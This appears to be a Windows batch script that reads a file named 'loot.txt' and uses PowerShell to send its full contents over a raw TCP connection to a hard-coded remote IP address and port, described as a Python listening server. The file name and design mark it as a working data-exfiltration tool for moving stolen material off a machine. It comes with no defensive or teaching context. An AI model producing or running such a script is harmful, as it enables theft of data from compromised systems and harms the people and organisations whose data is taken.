@echo off

REM Set the server host and port
set "serverHost=143.42.5.48"
set "serverPort=12345"

REM Set the path to the text file you want to upload
set "filePath=loot.txt"

REM Read the contents of the file into a variable
set /p fileContents=<"%filePath%"

REM Send file contents via TCP to the Python server using PowerShell
echo %fileContents% | powershell -command "$client = New-Object System.Net.Sockets.TcpClient('%serverHost%', %serverPort%); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine((Get-Content -Path '%filePath%' -Raw)); $writer.Flush(); $writer.Close(); $client.Close();"

echo File contents uploaded successfully.
